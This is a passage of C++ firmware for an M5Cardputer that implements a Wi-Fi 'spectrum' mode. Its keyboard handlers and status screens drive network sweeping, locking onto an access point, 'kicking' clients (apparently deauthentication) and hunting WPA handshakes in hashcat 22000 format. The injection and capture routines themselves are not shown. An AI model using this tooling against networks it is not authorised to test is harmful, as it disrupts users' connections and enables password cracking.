    memset(s_chHit, 0, sizeof(s_chHit));
    memset(s_chSnap, 0, sizeof(s_chSnap));
    memset(s_chRate, 0, sizeof(s_chRate));
    s_pktN = 0;
    s_pps = 0;
    radioOn();
    s_run = true;
    s_keyWas = true;
    s_lastHop = millis();
    s_ppsT0 = millis();
    s_huntDepth = Config::radio().hsDepth;
    if (s_huntDepth > 2) s_huntDepth = 2;
    Serial.println("[SPEC] sweep 2.4");
}

void stop() {
    if (!s_run) return;
    s_run = false;
    s_busy = true;
    s_reveal = false;
    if (Cap::isRunning()) Cap::stop();
    else radioOff();
    Avatar::resumeScene();
    Avatar::setState(AvatarState::NEUTRAL);
    s_nNet = 0;
    s_phase = SWEEP;
    s_busy = false;
    Serial.println("[SPEC] stop");
}

bool isRunning() { return s_run; }

void getStatusLine(char* out, size_t n) {
    if (!out || !n) return;
    bool keys = ((millis() / BAR_FLIP_MS) & 1) == 0;
    if (s_phase == HUNT) {
        if (keys) {
            snprintf(out, n, "D depth  ` stop");
        } else {
            snprintf(out, n, "HUNT %s  %s",
                     huntDepthName(s_huntDepth),
                     Hc22000::hasHandshake(s_monBssid, s_huntDepth) ? "DONE" : "wait");
        }
    } else if (s_phase == LOCK) {
        if (keys) {
            snprintf(out, n, "ENT hunt  D %s  SPC  `", huntDepthName(s_huntDepth));
        } else {
            int idx = findNet(s_monBssid);
            snprintf(out, n, "LOCK CH%u  %u STA",
                     s_monCh, idx >= 0 ? s_net[idx].nCli : 0);
        }
    } else if (keys) {
        snprintf(out, n, ";/. sel  ENT lock  A hunt  F  `");
    } else {
        snprintf(out, n, "SPEC  %u AP  CH%u  %upps", s_nNet, s_ch, (unsigned)s_pps);
    }
}

static void handleSweep() {
    if (M5Cardputer.Keyboard.isKeyPressed(';')) {
        int n = nextSel(-1);
        if (n >= 0) {
            setSel(n);
            SFX::play(SFX::MENU_CLICK);
        }
    }
    if (M5Cardputer.Keyboard.isKeyPressed('.')) {
        int n = nextSel(+1);
        if (n >= 0) {
            setSel(n);
            SFX::play(SFX::MENU_CLICK);
        }
    }
    if (M5Cardputer.Keyboard.isKeyPressed('f') || M5Cardputer.Keyboard.isKeyPressed('F')) {
        s_filt = (Filt)((s_filt + 1) & 3);
        if (s_sel < 0 || s_sel >= s_nNet || !passFilt(s_net[s_sel]))
            setSel(nextSel(+1));
        SFX::play(SFX::MENU_CLICK);
    }
    if (M5Cardputer.Keyboard.isKeyPressed('a') || M5Cardputer.Keyboard.isKeyPressed('A')) {
        enterHunt();
        return;
    }
    if (M5Cardputer.Keyboard.keysState().enter) enterLock();
}

static void handleLock() {
    if (s_reveal) {
        s_reveal = false;
        return;
    }
    int idx = findNet(s_monBssid);
    uint8_t nc = (idx >= 0) ? s_net[idx].nCli : 0;
    if (M5Cardputer.Keyboard.isKeyPressed(';') && nc) {
        if (s_cliSel > 0) s_cliSel--;
        SFX::play(SFX::MENU_CLICK);
    }
    if (M5Cardputer.Keyboard.isKeyPressed('.') && nc) {
        if (s_cliSel + 1 < nc) s_cliSel++;
        SFX::play(SFX::MENU_CLICK);
    }
    if (M5Cardputer.Keyboard.isKeyPressed('w') || M5Cardputer.Keyboard.isKeyPressed('W')) {
        if (idx >= 0 && s_net[idx].pmf) {
            Display::showToast("PMF — DEAF");
            return;
        }
        s_reveal = true;
        s_revealT0 = millis();
        s_revealBurst = 0;
        SFX::play(SFX::REVEAL_START);
        return;
    }
    if (M5Cardputer.Keyboard.keysState().enter ||
        M5Cardputer.Keyboard.isKeyPressed('a') ||
        M5Cardputer.Keyboard.isKeyPressed('A')) {
        enterHunt();
        return;
    }
    if (M5Cardputer.Keyboard.isKeyPressed('d') ||
        M5Cardputer.Keyboard.isKeyPressed('D')) {
        cycleHuntDepth();
        return;
    }
    if (M5Cardputer.Keyboard.isKeyPressed(' ')) kick(nc ? s_cliSel : -1);
}

static void handleHunt() {
    if (M5Cardputer.Keyboard.isKeyPressed('d') ||
        M5Cardputer.Keyboard.isKeyPressed('D')) {
        cycleHuntDepth();
        return;
    }
    if (M5Cardputer.Keyboard.isKeyPressed(' ')) {
        // Cap::loop() already kicks s_monBssid — don't double-fire.
        Display::showToast("ALREADY KICKING");
    }
}

void update() {
    if (!s_run) return;

    // Same as PigPass: open window → scene off; minimize → farm lives.
    if (App::windowHidden()) {
        if (Avatar::isSceneSuspended()) Avatar::resumeScene();
    } else {
        if (!Avatar::isSceneSuspended()) Avatar::suspendScene();
    }

    if (s_phase == HUNT) {
        Cap::loop();
    } else {
        hopTick();
        prune();
        updateBuf();
        revealTick();
    }
    if (s_beepCli) {
        s_beepCli = false;
        SFX::play(SFX::CLIENT_FOUND);
    }
    if (App::windowHidden()) return;
    if (!keyNewPress(s_keyWas)) return;
    if (keyEsc()) {
        if (s_phase == HUNT) {
            exitHunt();
            return;
        }
        if (s_phase == LOCK) {
            exitLock();
            return;
        }
        stop();
        return;
    }
    if (s_phase == HUNT) handleHunt();
    else if (s_phase == LOCK) handleLock();
    else handleSweep();
}

void draw(M5Canvas& canvas) {
    syncSel();
    uint16_t fg = getColorFG();
    uint16_t bg = getColorBG();
    canvas.fillSprite(bg);
    if (s_phase == HUNT) drawHunt(canvas, fg, bg);
    else if (s_phase == LOCK) drawLock(canvas, fg, bg);
    else drawSweep(canvas, fg, bg);
}

}  // namespace SpectrumMode
